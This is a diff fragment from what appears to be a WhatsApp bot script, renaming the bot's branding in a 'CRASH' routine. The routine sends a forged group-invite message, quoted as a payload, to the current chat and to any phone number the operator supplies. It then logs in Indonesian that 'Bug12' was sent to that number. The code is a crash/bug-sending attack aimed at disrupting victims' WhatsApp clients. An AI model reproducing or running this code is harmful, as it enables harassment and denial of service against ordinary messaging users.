 "groupInviteMessage": {
 "groupJid": "6288213840883-1616169743@g.us",
 "inviteCode": `ith6ffr68`,
-"groupName": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]`, 
-"caption": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]`, 
+"groupName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
+"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]`, 
 'jpegThumbnail': virgam
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:finv1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:finv1})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:finv1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:finv1})
 jancok(`Berhasil Mengirim Bug12 Di Nomer ${text}`)
 break
 
